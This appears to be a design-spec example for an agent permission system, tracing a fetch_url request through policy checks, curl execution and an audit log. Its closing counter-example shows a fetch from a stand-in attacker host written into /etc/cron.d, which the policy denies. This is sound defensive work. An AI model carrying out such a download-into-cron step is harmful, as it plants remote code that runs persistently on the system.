@@ -1,0 +1,230 @@
+# Runtime PDP query shape for fetch_url@2.0.0
+# LKI format version: 0.2
+#
+# CHANGES FROM v1.0.0 PROJECTION:
+#   - Context includes 'purpose' attribute per F-027
+#   - Context includes 'timeout_bound' from resource_bound parameter
+#   - Audit entry follows v0.2 Chapter 10 canonical structure
+#   - Resolver pipeline references v0.2 Chapter 11 stages explicitly
+
+# ============================================================================
+# Scenario: Agent fetches a public API response and saves to a file
+# ============================================================================
+
+intent:
+  name: fetch_url
+  version: "2.0.0"
+  parameters:
+    url: "https://api.github.com/repos/playgroundlogic/walkabl"
+    output: "/home/agent/workspace/walkabl-repo-info.json"
+    timeout: "30s"
+
+principal:
+  id: "agent-session-abc123"
+  labels: ["developer"]
+  working_dir: "/home/agent/workspace"
+  session_id: "sess-2026-05-19-001"
+
+# ============================================================================
+# Resolver pipeline (Chapter 11, stages 1-7 produce the PDP decisions)
+# ============================================================================
+
+# Stage 1: Parameter parsing and type validation
+#   - url parses as URL@1.x; .scheme="https", .host="api.github.com", .port=443
+#   - output parses as FilePath@1.x; canonical = "/home/agent/workspace/walkabl-repo-info.json"
+#   - timeout parses as Duration@1.x; .seconds = 30; is_resource_bound applies
+# Result: validated parameters.
+
+# Stage 2: Resolver constraints
+#   fetch_url has empty resolver_constraints: {}; nothing to check.
+
+# Stage 3: Cross-parameter constraints
+#   "method == HEAD implies output is null" — method is GET (default), so no constraint fires.
+
+# Stage 4: Conditional capability resolution
+#   network capability: required (no required_if; always needed)
+#   filesystem capability: required_if "output is not null" → output is set, so capability is required
+
+# Stage 5: Capability expansion
+#   network capability resolves to:
+#     direction: outbound
+#     host: Lki::Host::"api.github.com" with observed attrs:
+#       is_loopback: false, is_private: false, is_metadata: false
+#     port: 443
+#     protocol: "https"
+#   filesystem capability resolves to one PDP query (paths is a one-element list):
+#     operation: write
+#     path: Lki::FilePath::"/home/agent/workspace/walkabl-repo-info.json" with observed attrs:
+#       is_within_working_dir: true, is_system_path: false
+#     recursive: false, follow_symlinks: false
+
+# Stage 6: PDP query construction (two queries)
+
+pdp_request_1:
+  principal: Lki::Principal::"agent-session-abc123"
+  action: Lki::Action::"Network::Outbound"
+  resource: Lki::Host::"api.github.com"
+  context:
+    intent_name: "fetch_url"
+    intent_version: "2.0.0"
+    purpose: "user_facing"
+    port: 443
+    protocol: "https"
+    timeout_bound: 30
+
+pdp_request_2:
+  principal: Lki::Principal::"agent-session-abc123"
+  action: Lki::Action::"Filesystem::Write"
+  resource: Lki::FilePath::"/home/agent/workspace/walkabl-repo-info.json"
+  context:
+    intent_name: "fetch_url"
+    intent_version: "2.0.0"
+    purpose: "user_facing"
+    recursive: false
+    follow_symlinks: false
+    timeout_bound: 30
+
+# Stage 7: PDP evaluation
+#
+# Request 1: Network::Outbound
+#   - Safety floor: not metadata host → no forbid fires
+#   - Baseline: https + user_facing + not loopback + not private → permit matches
+#   - Baseline timeout: 30 <= 300 → no forbid fires
+#   - Decision: Allow
+#
+# Request 2: Filesystem::Write
+#   - Safety floor: not system path → no forbid fires
+#   - Safety floor: is_within_working_dir → no forbid fires
+#   - Baseline: user_facing + within working_dir + not system → permit matches
+#   - Decision: Allow
+#
+# Both Allow → intent proceeds (atomicity check, F-006)
+
+# Stages 8-10: Implementation selection, template substitution, execution
+#   curl available, satisfies "curl >= 7.50", selected (priority 100)
+#   Template with parameter_mapping yields:
+#     curl --fail --silent --show-error --location=true --max-time 30
+#          --output /home/agent/workspace/walkabl-repo-info.json
+#          https://api.github.com/repos/playgroundlogic/walkabl
+#   Execution succeeds in 412ms
+
+# Stage 11: Audit log emission (per Chapter 10)
+
+# ============================================================================
+# Audit entry (Chapter 10 schema)
+# ============================================================================
+
+audit_entry:
+  entry_id: "sha256:9f8a3b4c..."        # computed from canonicalized content below
+  schema_version: "0.2"
+  timestamp: "2026-05-19T14:23:11.482Z"
+
+  principal:
+    id: "agent-session-abc123"
+    session_id: "sess-2026-05-19-001"
+    labels: ["developer"]
+
+  intent:
+    name: "fetch_url"
+    version: "2.0.0"
+
+  intent_parameters:
+    url: "https://api.github.com/repos/playgroundlogic/walkabl"
+    output: "/home/agent/workspace/walkabl-repo-info.json"
+    timeout: "30s"
+
+  resource_bounds:
+    timeout: "30s"
+
+  observed_state:
+    "Host:api.github.com":
+      is_loopback: false
+      is_private: false
+      is_metadata: false
+    "FilePath:/home/agent/workspace/walkabl-repo-info.json":
+      is_within_working_dir: true
+      is_system_path: false
+      exists: false
+
+  resolved_capabilities:
+    - source: "network[0]"
+      purpose: user_facing
+      details: "outbound to api.github.com:443/https"
+    - source: "filesystem[0]"
+      purpose: user_facing
+      details: "write to /home/agent/workspace/walkabl-repo-info.json"
+
+  pdp_decisions:
+    - capability_source: "network[0]"
+      cedar_request:
+        principal: "Lki::Principal::\"agent-session-abc123\""
+        action: "Lki::Action::\"Network::Outbound\""
+        resource: "Lki::Host::\"api.github.com\""
+      decision: "Allow"
+      determining_policies: ["baseline-network-https-public"]
+      evaluation_duration_ms: 3
+    - capability_source: "filesystem[0]"
+      cedar_request:
+        principal: "Lki::Principal::\"agent-session-abc123\""
+        action: "Lki::Action::\"Filesystem::Write\""
+        resource: "Lki::FilePath::\"/home/agent/workspace/walkabl-repo-info.json\""
+      decision: "Allow"
+      determining_policies: ["baseline-filesystem-working-dir"]
+      evaluation_duration_ms: 2
+
+  intent_outcome: "Allow"
+
+  execution:
+    started_at: "2026-05-19T14:23:11.487Z"
+    completed_at: "2026-05-19T14:23:11.899Z"
+    duration_ms: 412
+    result: "success"
+
+# ============================================================================
+# Counter-example: agent attempts to write to system path
+# ============================================================================
+
+counter_example:
+  scenario: "Agent tries fetch_url with output to /etc/cron.d/agent-job"
+  intent:
+    name: fetch_url
+    version: "2.0.0"
+    parameters:
+      url: "https://attacker.example.com/payload"
+      output: "/etc/cron.d/agent-job"
+
+  pdp_request_for_filesystem:
+    action: Lki::Action::"Filesystem::Write"
+    resource: Lki::FilePath::"/etc/cron.d/agent-job"
+    context:
+      intent_name: "fetch_url"
+      intent_version: "2.0.0"
+      purpose: "user_facing"
+      recursive: false
+      follow_symlinks: false
+      timeout_bound: 30
+
+  observed_state:
+    "FilePath:/etc/cron.d/agent-job":
+      is_system_path: true              # /etc is in system path tree
+      is_within_working_dir: false
+
+  pdp_decision: Deny
+  determining_policy: "safety-floor-no-system-path-writes"
+
+  intent_outcome: Deny
+  partial_state: none                   # atomicity: intent fails before any execution
+  error_returned_to_caller: |
+    {
+      "intent": "fetch_url@2.0.0",
+      "decision": "Deny",
+      "denied_capability": "filesystem[0]",
+      "denied_resource": "FilePath:/etc/cron.d/agent-job",
+      "determining_policy": "safety-floor-no-system-path-writes",
+      "policy_reason": "writes to system paths require explicit per-path permission"
+    }
+
+# The network request is also constructed (Stage 6 expands all capabilities)
+# but its evaluation is short-circuited once any Deny is observed in the
+# atomicity check (Stage 7). The audit log still records BOTH the network
+# Allow-decision and the filesystem Deny-decision for full forensics.
